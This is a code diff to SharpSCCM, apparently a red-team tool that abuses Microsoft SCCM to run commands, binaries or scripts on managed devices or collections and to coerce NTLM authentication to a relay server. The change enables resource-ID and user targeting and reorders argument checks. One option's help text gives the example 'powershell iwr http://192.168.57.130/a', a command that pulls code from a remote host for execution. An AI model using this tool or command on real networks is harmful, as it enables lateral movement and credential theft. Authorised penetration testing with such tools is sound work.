@@ -61,24 +61,28 @@ namespace SharpSCCM
                 execCommand.Add(new Option<string>(new[] { "--collection-name", "-n" }, "The name of the device or user collection to execute a command, binary, or script on or receive NTLM authentication from"));
                 execCommand.Add(new Option<string>(new[] { "--path", "-p" }, "The command or the UNC path of the binary/script to execute (e.g., \"powershell iwr http://192.168.57.130/a\", \"C:\\Windows\\System32\\calc.exe\", \"\\\\site-server.domain.com\\Sources$\\my.exe\")"));
                 execCommand.Add(new Option<string>(new[] { "--relay-server", "-r" }, "The NetBIOS name, IP address, or if WebClient is enabled on the targeted client device, the IP address and port (e.g., \"192.168.1.1@8080\") of the relay/capture server (default: the machine running SharpSCCM)"));
-                //execCommand.Add(new Option<string>(new[] { "--resource-id", "-rid" }, "The unique ResourceID of the device or user to execute an application on or receive NTLM authentication from"));
+                execCommand.Add(new Option<string>(new[] { "--resource-id", "-rid" }, "The unique ResourceID of the device or user to execute a command, binary, or script on or receive NTLM authentication from"));
                 execCommand.Add(new Option<bool>(new[] { "--run-as-system", "-s" }, "Execute the application in the SYSTEM context (default: logged on user)"));
                 execCommand.Add(new Option<string>(new[] { "--collection-type", "-t" }, "The type of the collection (\"device\" or \"user\")").FromAmong(new string[] { "device", "user" }));
-                //execCommand.Add(new Option<string>(new[] { "--user", "-u" }, "The UniqueUserName of the user to execute an application as or receive NTLM authentication from (e.g., \"APERTURE\\cave.johnson\")"));
+                execCommand.Add(new Option<string>(new[] { "--user", "-u" }, "The UniqueUserName of the user to execute an application as or receive NTLM authentication from (e.g., \"APERTURE\\cave.johnson\")"));
                 execCommand.Add(new Option<string>(new[] { "--management-point", "-mp" }, "The IP address, FQDN, or NetBIOS name of the management point to connect to (default: the current management point of the client running SharpSCCM)"));
                 execCommand.Add(new Option<string>(new[] { "--site-code", "-sc" }, "The three character site code (e.g., \"PS1\") (default: the site code of the client running SharpSCCM)"));
                 execCommand.Handler = CommandHandler.Create(
                     (string device, string collectionId, string collectionName, string path, string relayServer, string resourceId, bool runAsSystem, string collectionType, string user, string managementPoint, string siteCode) =>
                     {
-                        if (string.IsNullOrEmpty(device) && string.IsNullOrEmpty(collectionId) && string.IsNullOrEmpty(collectionName) && string.IsNullOrEmpty(user))
-                        {
-                            Console.WriteLine("[!] Please specify a device (-d), collection Name (-n), or CollectionID (-i)");
-                        }
-                        else if (!String.IsNullOrEmpty(relayServer) && !String.IsNullOrEmpty(path) || (String.IsNullOrEmpty(relayServer) && String.IsNullOrEmpty(path)))
+                        if (!string.IsNullOrEmpty(relayServer) && !string.IsNullOrEmpty(path) || (string.IsNullOrEmpty(relayServer) && string.IsNullOrEmpty(path)))
                         {
                             Console.WriteLine("[!] Please specify either a path (-p) or a relay server (-r)");
                         }
-                        else
+                        else if (string.IsNullOrEmpty(device) && string.IsNullOrEmpty(collectionId) && string.IsNullOrEmpty(collectionName) && string.IsNullOrEmpty(resourceId) && string.IsNullOrEmpty(user))
+                        {
+                            Console.WriteLine("[!] Please specify a collection Name (-n), CollectionID (-i), device Name (-d), user UniqueUserName (-u), or ResourceID (-rid) to execute the application");
+                        }
+                        else if (!string.IsNullOrEmpty(device) && !string.IsNullOrEmpty(user))
+                        {
+                            Console.WriteLine("[!] Please specify either a device Name (-d) or a user UniqueUserName (-u)");
+                        }
+                        else 
                         {
                             ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                             if (wmiConnection != null && wmiConnection.IsConnected)
@@ -366,7 +370,7 @@ namespace SharpSCCM
                         }
                         if (properties.Length == 0 && !verbose)
                         {
-                            properties = new[] { "Active", "ADSiteName", "Client", "DistinguishedName", "FullDomainName", "HardwareID", "IPAddresses", "IPSubnets", "IPv6Addresses", "IPv6Prefixes", "IsVirtualMachine", "LastLogonTimestamp", "LastLogonUserDomain", "LastLogonUserName", "MACAddresses", "Name", "NetbiosName", "Obsolete", "OperatingSystemNameandVersion", "PrimaryGroupID", "ResourceDomainORWorkgroup", "ResourceID", "ResourceNames", "SID", "SMSInstalledSites", "SMSUniqueIdentifier", "SNMPCommunityName", "SystemContainerName", "SystemGroupName", "SystemOUName" };
+                            properties = new[] { "Active", "ADSiteName", "Client", "DistinguishedName", "FullDomainName", "HardwareID", "IPAddresses", "IPSubnets", "IPv6Addresses", "IPv6Prefixes", "IsVirtualMachine", "LastLogonTimestamp", "LastLogonUserDomain", "LastLogonUserName", "MACAddresses", "Name", "NetbiosName", "Obsolete", "OperatingSystemNameandVersion", "PrimaryGroupID", "ResourceDomainORWorkgroup", "ResourceId", "ResourceNames", "SID", "SMSInstalledSites", "SMSUniqueIdentifier", "SNMPCommunityName", "SystemContainerName", "SystemGroupName", "SystemOUName" };
                         }
                         ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                         if (wmiConnection != null && wmiConnection.IsConnected)
@@ -1177,6 +1181,10 @@ namespace SharpSCCM
                    .Build();
                 commandLine.Invoke(args);
 
+                // Stop timer and complete execution
+                timer.Stop();
+                Console.WriteLine($"[+] Completed execution in {timer.Elapsed}");
+
                 // Delay completion when debugging
                 if (Debugger.IsAttached)
                     Console.ReadLine();
@@ -1189,10 +1197,6 @@ namespace SharpSCCM
                     consoleTracer.Close();
                     Trace.Close();
                 }
-
-                // Stop timer and complete execution
-                timer.Stop();
-                Console.WriteLine($"[+] Completed execution in {timer.Elapsed}");
             }
             catch (Exception ex)
             {
